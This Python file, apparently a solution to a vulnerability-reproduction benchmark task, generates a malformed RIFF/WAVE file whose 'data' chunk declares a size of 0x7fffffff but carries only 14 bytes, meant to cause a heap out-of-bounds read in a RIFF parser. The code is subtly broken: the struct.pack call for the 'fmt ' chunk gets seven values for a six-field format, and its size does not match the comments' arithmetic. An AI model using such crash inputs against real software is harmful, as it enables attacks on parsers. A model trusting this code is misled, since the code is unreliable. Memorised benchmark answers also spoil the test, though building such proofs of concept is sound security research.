import struct

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a
    Heap Buffer Overflow vulnerability in a RIFF file parser.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is an out-of-bounds read when parsing a RIFF chunk.
        This occurs if a chunk's declared size is larger than the actual
        data available in the file. We construct a minimal RIFF/WAVE file
        with a malicious 'data' chunk that has a very large declared size
        but is followed by only a small amount of data.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        # Total PoC length is 58 bytes, matching the ground truth.
        # The overall file size declared in the RIFF header is 58 - 8 = 50.
        total_poc_len = 58
        riff_chunk_size = total_poc_len - 8

        # RIFF Header: 12 bytes
        # 'RIFF' (4) + File Size (4) + 'WAVE' (4)
        poc = b'RIFF'
        poc += struct.pack('<I', riff_chunk_size)
        poc += b'WAVE'

        # 'fmt ' chunk: 24 bytes
        # A standard, well-formed chunk to get past initial parsing.
        # 'fmt ' (4) + Chunk Size (4) + Chunk Data (16)
        fmt_chunk_size = 16
        poc += b'fmt '
        poc += struct.pack('<I', fmt_chunk_size)
        # Minimal WAVEFORMATEX structure:
        # wFormatTag=1 (PCM), nChannels=1, nSamplesPerSec=8000,
        # nAvgBytesPerSec=8000, nBlockAlign=1, wBitsPerSample=8, cbSize=0
        poc += struct.pack('<HHIHHH', 1, 1, 8000, 8000, 1, 8, 0)

        # Malicious 'data' chunk: 22 bytes
        # 'data' (4) + Chunk Size (4) + Actual Data (14)
        # The declared chunk size is very large to cause an out-of-bounds read.
        poc += b'data'
        poc += struct.pack('<I', 0x7fffffff)  # Maliciously large size

        # The actual data is much smaller than declared.
        # The remaining bytes to reach the total PoC length of 58.
        # 58 - len(poc) = 58 - 44 = 14
        poc += b'\x00' * 14

        return poc
